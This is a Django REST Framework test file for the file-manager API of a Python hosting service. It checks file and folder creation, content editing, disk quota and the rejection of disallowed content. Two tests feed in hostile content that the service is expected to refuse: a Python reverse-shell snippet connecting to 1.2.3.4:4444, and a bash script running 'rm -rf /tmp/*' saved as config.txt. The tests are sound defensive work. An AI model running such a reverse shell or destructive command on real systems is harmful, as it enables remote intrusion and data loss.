from django.test import TestCase
from django.contrib.auth import get_user_model
from rest_framework.test import APIClient
from rest_framework import status
from apps.filemanager.models import File, Folder

User = get_user_model()

class FileManagerAPITest(TestCase):
    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(username='filetester', email='filetester@example.com', password='password123')
        self.client.force_authenticate(user=self.user)

    def test_file_tree_empty(self):
        res = self.client.get('/api/files/tree/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertEqual(res.data['tree'], [])
        self.assertEqual(res.data['root_files'], [])

    def test_create_file_and_edit_content(self):
        res = self.client.post('/api/files/create/', {'name': 'main.py'})
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        file_id = res.data['id']

        get_res = self.client.get(f'/api/files/{file_id}/content/')
        self.assertEqual(get_res.status_code, status.HTTP_200_OK)
        self.assertIn("Py Hosting", get_res.data['content'])

        new_code = "print('Salom PyHosting!')\n"
        patch_res = self.client.patch(f'/api/files/{file_id}/content/', {'content': new_code})
        self.assertEqual(patch_res.status_code, status.HTTP_200_OK)

        self.user.quota.refresh_from_db()
        self.assertGreater(self.user.quota.used_disk_mb, 0)

    def test_disallowed_extension_rejected(self):
        res = self.client.post('/api/files/create/', {'name': 'malware.exe'})
        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)

    def test_create_folder_and_delete(self):
        res = self.client.post('/api/files/folder/', {'name': 'my_bot_folder'})
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        folder_id = res.data['id']

        del_res = self.client.delete(f'/api/files/folder/{folder_id}/')
        self.assertEqual(del_res.status_code, status.HTTP_200_OK)

    def test_save_malicious_reverse_shell_rejected(self):
        res = self.client.post('/api/files/create/', {'name': 'bot.py'})
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        file_id = res.data['id']

        rev_shell_payload = (
            "import socket, os\n"
            "s = socket.socket()\n"
            "s.connect(('1.2.3.4', 4444))\n"
            "os.dup2(s.fileno(), 0)\n"
        )
        patch_res = self.client.patch(f'/api/files/{file_id}/content/', {'content': rev_shell_payload})
        self.assertEqual(patch_res.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("Xavfsizlik", patch_res.data['error'])

    def test_disguised_shell_script_rejected(self):
        res = self.client.post('/api/files/create/', {'name': 'config.txt'})
        self.assertEqual(res.status_code, status.HTTP_201_CREATED)
        file_id = res.data['id']

        bash_script = "#!/bin/bash\nrm -rf /tmp/*\n"
        patch_res = self.client.patch(f'/api/files/{file_id}/content/', {'content': bash_script})
        self.assertEqual(patch_res.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("Xavfsizlik", patch_res.data['error'])
